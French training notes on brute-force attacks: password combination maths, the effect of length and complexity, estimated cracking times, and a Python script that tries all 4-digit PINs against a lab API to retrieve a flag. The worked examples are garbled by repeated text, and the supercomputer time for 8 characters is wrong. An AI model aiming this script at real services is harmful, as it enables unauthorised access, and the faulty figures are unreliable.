# Brute Force Attacks

***

## <mark style="color:red;">**1. Formule des Combinaisons possibles**</mark> :man\_scientist:

Le nombre total de combinaisons possibles pour un mot de passe dépend de la taille de l’ensemble des caractères et de la longueur du mot de passe :

```mathml
Possible Combinations = Character Set Size^Password Length
```

* **Exemple** :
  * 6 caractères (minuscule uniquement) → 266=308,915,77626^6 = 308,915,776266=308,915,776
  * 8 caractères (minuscule uniquement) → 268=208,827,064,57626^8 = 208,827,064,576268=208,827,064,576
  * 8 caractères (majuscules + minuscules) → 528=53,459,728,531,45652^8 = 53,459,728,531,456528=53,459,728,531,456
  * 12 caractères (majuscules, minuscules, chiffres, symboles) → 9412=475,920,493,781,698,549,50494^{12} = 475,920,493,781,698,549,5049412=475,920,493,781,698,549,504

***

## <mark style="color:red;">**2. Impact de la Longueur et de la Complexité**</mark> :closed\_lock\_with\_key:

* **Augmenter la longueur** : Chaque caractère supplémentaire **augmente exponentiellement** le nombre de combinaisons.
* **Ajouter de la complexité** : Inclure majuscules, chiffres, et symboles élargit l’ensemble des caractères et complique le travail des attaquants.

***

## <mark style="color:red;">**3. Puissance de Calcul et Temps de Brute Force**</mark> :calling:

Le temps nécessaire pour forcer un mot de passe dépend :

1. **De la taille de l’espace de recherche (combinaisons possibles)**.
2. **De la puissance de calcul disponible (guesses/seconde)**.

| **Puissance**                 | **Exemple**                       | **Temps nécessaire** |
| ----------------------------- | --------------------------------- | -------------------- |
| **Ordinateur de base** (1M/s) | 8 caractères (lettres + chiffres) | \~6,92 ans           |
| **Superordinateur** (1T/s)    | 8 caractères (lettres + chiffres) | \~6 secondes         |
| **Superordinateur** (1T/s)    | 12 caractères (ASCII complet)     | \~15 000 ans         |

***

## <mark style="color:red;">**4. Cas Pratique : Attaque Brute Force sur un PIN**</mark>

**Exemple d’application :**\
Un système génère un PIN à 4 chiffres aléatoire, accessible via une API `/pin`.

```python
import requests

ip = "127.0.0.1"  # Modifier avec l'adresse IP cible
port = 1234       # Modifier avec le port cible

# Itération sur tous les PINs possibles (0000 à 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Format : 4 chiffres (ex : 7 → "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Requête à l'API
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Vérifier si la réponse contient le succès et le flag
    if response.ok and 'flag' in response.json():  # .ok : statut HTTP 200
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break

```
